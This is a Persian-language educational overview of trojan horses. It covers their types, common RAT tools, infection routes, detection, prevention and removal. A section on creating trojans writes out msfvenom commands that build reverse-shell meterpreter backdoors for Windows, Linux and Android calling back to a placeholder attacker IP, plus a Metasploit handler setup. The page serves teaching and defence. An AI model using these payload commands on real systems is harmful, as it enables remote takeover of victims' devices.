---
title: تروجان
description: درک اسب‌های تروا، انواع، ایجاد و مکانیزم‌های دفاعی
---

## تروجان چیست؟

اسب‌های تروا برنامه‌های مخربی هستند که به عنوان نرم‌افزار قانونی جعل شده‌اند. برخلاف ویروس‌ها و کرم‌ها، تروجان‌ها خودبازتولید ندارند اما برای فریب دادن کاربران به اجرای آن‌ها به مهندسی اجتماعی تکیه می‌کنند.

## ویژگی‌ها

- **جعل شده**: قانونی به نظر می‌رسد
- **بدون خودبازتولید**: کاربر باید اجرا کند
- **تحویل بار مخرب**: درب پشتی نصب می‌کند
- **دسترسی از راه دور**: کنترل مهاجم را فراهم می‌کند
- **پایدار**: دسترسی را حفظ می‌کند

## انواع تروجان

### 1. تروجان دسترسی از راه دور (RAT)
- کنترل کامل سیستم
- مثال‌ها: DarkComet، njRAT، Poison Ivy
- ویژگی‌ها: مدیریت فایل، ثبت کلید، ضبط صفحه

### 2. تروجان بانکی
- سرقت اعتبارنامه‌های مالی
- مثال‌ها: Zeus، Dridex، TrickBot
- حملات مرد-در-مرورگر

### 3. تروجان دانلودکننده
- دانلود بدافزار اضافی
- بار اولیه کوچک
- فرار از تشخیص

### 4. تروجان درب پشتی
- دور زدن احراز هویت
- ایجاد نقاط ورود پنهان
- دسترسی پایدار

### 5. تروجان روت‌کیت
- پنهان کردن حضور بدافزار
- دسترسی سطح کرنل
- حذف دشوار

### 6. تروجان DDoS
- بخشی از بات‌نت
- راه‌اندازی حملات توزیع شده
- مثال‌ها: HOIC، LOIC

### 7. تروجان باج‌افزار
- رمزگذاری فایل‌ها
- درخواست پرداخت
- مثال‌ها: Locky، Cerber

## ابزارهای RAT رایج

### تجاری/قانونی
- **TeamViewer**: پشتیبانی از راه دور (می‌تواند سوءاستفاده شود)
- **AnyDesk**: دسکتاپ از راه دور
- **Remote Desktop Protocol**: داخلی Windows

### مخرب
- **DarkComet**: RAT کامل
- **njRAT**: محبوب در خاورمیانه
- **Poison Ivy**: ابزار APT
- **AsyncRAT**: متن‌باز
- **Quasar**: مبتنی بر C#

## روش‌های عفونت

### مهندسی اجتماعی
```
به‌روزرسانی‌های جعلی نرم‌افزار
نرم‌افزار دزدی
پیوست‌های ایمیل
تقلب/کرک بازی
ابزارهای رایگان
```

### دانلودهای خودکار
- وب‌سایت‌های خطرناک
- تبلیغات مخرب
- کیت‌های اکسپلویت

### USB/رسانه قابل جابجایی
- تروجان‌های auto-run
- فایل‌های جعلی

## ایجاد تروجان (آموزشی)

### مثال msfvenom
```bash
# تولید تروجان Windows
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -f exe > backdoor.exe

# تروجان Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -f elf > backdoor.elf

# APK اندروید
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -o backdoor.apk
```

### Metasploit Handler
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

## روش‌های تشخیص

### تحلیل رفتار
- اتصالات شبکه غیرمنتظره
- پروسس‌های ناشناخته
- تغییرات رجیستری
- تغییرات فایل سیستم
- استفاده بالای CPU/حافظه

### تحلیل ایستا
```bash
# بررسی ویژگی‌های فایل
file suspicious.exe
strings suspicious.exe
hexdump -C suspicious.exe | less

# محاسبه هش
md5sum suspicious.exe
sha256sum suspicious.exe
```

### تحلیل پویا
```bash
# نظارت بر شبکه در sandbox
tcpdump -i any -n

# نظارت پروسس
strace ./suspicious
ltrace ./suspicious
```

### ابزارها
- **VirusTotal**: اسکنر آنلاین
- **Hybrid Analysis**: sandbox خودکار
- **Process Monitor**: Windows
- **Wireshark**: تحلیل شبکه
- **Autoruns**: برنامه‌های استارت‌آپ

## پیشگیری

### آموزش کاربر
- از دانلودهای ناشناخته اجتناب کنید
- منابع نرم‌افزار را تأیید کنید
- پسوندهای فایل را بررسی کنید
- ایمیل‌های مشکوک را باز نکنید

### کنترل‌های فنی
- آنتی‌ویروس/EDR
- لیست سفید برنامه
- فایروال مبتنی بر هاست
- کمترین امتیاز
- به‌روزرسانی‌های منظم

### امنیت شبکه
- فیلتر خروجی
- IDS/IPS
- بخش‌بندی شبکه
- نظارت بر اتصالات خروجی

## حذف

### مراحل دستی
1. **بوت Safe Mode**
2. **غیرفعال کردن آیتم‌های استارت‌آپ**
3. **کشتن پروسس‌های مخرب**
4. **حذف فایل‌های تروجان**
5. **پاکسازی رجیستری** (Windows)
6. **بازنشانی مرورگر**

### ابزارهای خودکار
```bash
# Linux
sudo apt install clamav
sudo freshclam
sudo clamscan -r --remove /

# اسکن دایرکتوری خاص
sudo clamscan -r /home/user/
```

## تروجان‌های معروف

- **Zeus (2007)**: تروجان بانکی، +70M$ سرقت
- **Emotet (2014)**: مبتنی بر ایمیل، ماژولار
- **TrickBot (2016)**: بانکی، سرقت اعتبارنامه
- **Ryuk (2018)**: باج‌افزار، حملات هدفمند

## هشدار قانونی

⚠️ **ایجاد و توزیع تروجان غیرقانونی است!**
- فقط برای تست مجاز
- اهداف آموزشی در آزمایشگاه
- مجوز کتبی لازم
- راهنماهای اخلاقی الزامی

## منابع

- MITRE ATT&CK: تکنیک‌های تروجان
- Malware Traffic Analysis
- Any.run: sandbox تعاملی
